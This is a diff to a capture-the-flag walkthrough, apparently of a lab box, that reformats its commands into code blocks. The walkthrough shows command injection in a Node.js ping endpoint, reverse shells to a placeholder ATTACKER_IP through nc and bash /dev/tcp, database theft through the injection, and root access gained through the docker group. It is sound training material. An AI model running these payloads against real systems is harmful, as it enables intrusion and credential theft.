@@ -93,6 +93,7 @@ Final Access| "root"
 
 I started with a full TCP port scan, service version detection and default NSE scripts.
 
+```
 nmap -sV -sC -Pn -p- <TARGET>
 
 Open Ports
@@ -101,7 +102,7 @@ Open Ports
 22/tcp      SSH       OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
 8081/tcp    HTTP      Node.js / Express
 31331/tcp   HTTP      Apache 2.4.41 (Ubuntu)
-
+```
 The HTTP service running on port "31331" was unusual, so I started with web enumeration.
 
 ---
@@ -109,28 +110,28 @@ The HTTP service running on port "31331" was unusual, so I started with web enum
 🌐 2. Web Enumeration
 
 I ran Gobuster against the Apache service:
-
+```
 gobuster dir \
 -u http://<TARGET>:31331 \
 -w /usr/share/wordlists/dirb/common.txt \
 -x js
-
+```
 The scan discovered:
 
 /js
 
 Since JavaScript files can contain references to API endpoints, I checked for references to the Node.js service:
-
+```
 curl -s http://<TARGET>/js | grep "8081"
-
+```
 No useful result was returned.
 
 I then moved to the Node.js application running on port "8081".
-
+```
 gobuster dir \
 -u http://<TARGET>:8081 \
 -w /usr/share/wordlists/dirb/common.txt
-
+```
 Interesting endpoints:
 
 /auth
@@ -147,20 +148,20 @@ The error indicated that the application was attempting to use ".replace()" on a
 This suggested that the endpoint was processing user-controlled input.
 
 I used FFUF to discover the parameter name:
-
+```
 ffuf \
 -u "http://<TARGET>:8081/ping?FUZZ=test" \
 -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
 -fs 1094
-
+```
 The parameter discovered was:
 
 ip
 
 I tested it with a normal IP address:
-
+```
 curl "http://<TARGET>:8081/ping?ip=127.0.0.1"
-
+```
 The endpoint returned the expected ping output.
 
 At this point, the "ip" parameter became the primary attack surface.
@@ -172,9 +173,9 @@ At this point, the "ip" parameter became the primary attack surface.
 I tested whether I could append another command to the ping operation.
 
 I used URL-encoded newline characters:
-
+```
 curl "http://<TARGET>:8081/ping?ip=127.0.0.1%0aid"
-
+```
 The response included:
 
 uid=1002(www)
@@ -196,9 +197,9 @@ Impact: arbitrary command execution in the context of the "www" user.
 After confirming command injection, I attempted to obtain an interactive shell.
 
 My first attempt used "nc" with the "-e" option:
-
+```
 nc${IFS}<ATTACKER_IP>${IFS}4444${IFS}-e${IFS}/bin/bash
-
+```
 This failed.
 
 The target returned:
@@ -210,21 +211,21 @@ The usage output indicated that the installed version of Netcat did not support 
 This was useful information because it showed that I needed another approach for the reverse shell.
 
 I then tested a Bash-based reverse shell:
-
+```
 bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
-
+```
 The reverse shell succeeded.
 
 I also used:
-
+```
 nohup bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' &
-
+```
 The resulting shell was:
-
+```
 bash: cannot set terminal process group (...): Inappropriate ioctl for device
 bash: no job control in this shell
 www@ip-10-66-180-224:~/api$
-
+```
 At this point, I had a shell as "www".
 
 ---
@@ -232,9 +233,9 @@ At this point, I had a shell as "www".
 📂 6. Local Enumeration
 
 From the command injection, I started enumerating the application directory.
-
+```
 curl "http://<TARGET>:8081/ping?ip=127.0.0.1%0als%20-la"
-
+```
 The directory contained:
 
 total 84
@@ -258,18 +259,18 @@ A SQLite database inside the application directory was a strong candidate for se
 🗄️ 7. SQLite Database Extraction
 
 I first confirmed that I could read the database through command injection:
-
+```
 curl "http://<TARGET>:8081/ping?ip=127.0.0.1%0acat%20utech.db.sqlite"
-
+```
 Instead of relying on the HTTP response alone, I downloaded the database locally.
 
 Because the database was binary data, I used "curl -G" with "--data-urlencode":
-
+```
 curl -G "http://<TARGET>:8081/ping" \
 --data-urlencode "ip=127.0.0.1
 cat utech.db.sqlite" \
 -o meu_banco.db
-
+```
 The file was successfully downloaded:
 
 8453 bytes
@@ -300,17 +301,17 @@ Username| Password
 I then investigated the "/auth" endpoint.
 
 First:
-
+```
 curl "http://<TARGET>:8081/auth"
-
+```
 The application responded:
 
 You must specify a login and a password
 
 I tested the recovered credentials:
-
+```
 curl "http://<TARGET>:8081/auth?login=admin&password=mrsheafy"
-
+```
 The application returned:
 
 <h1>Restricted area</h1>
@@ -360,9 +361,9 @@ ssh r00t@<TARGET>
 This succeeded.
 
 I checked the current privileges:
-
+```
 id
-
+```
 Result:
 
 uid=1001(r00t)
@@ -380,9 +381,9 @@ The user was a member of the "docker" group.
 🐳 11. Docker Privilege Escalation
 
 I enumerated the available Docker images:
-
+```
 docker images
-
+```
 The target contained:
 
 REPOSITORY   TAG      IMAGE ID        SIZE
@@ -391,13 +392,13 @@ bash         latest   495d6437fc1e    15.8MB
 Membership in the Docker group is security-sensitive because Docker provides highly privileged interaction with the host.
 
 I launched a container while mounting the host filesystem:
-
+```
 docker run -v /:/mnt --rm -it bash chroot /mnt /bin/sh
-
+```
 Inside the resulting environment, I checked my privileges:
-
+```
 id
-
+```
 Result:
 
 uid=0(root)
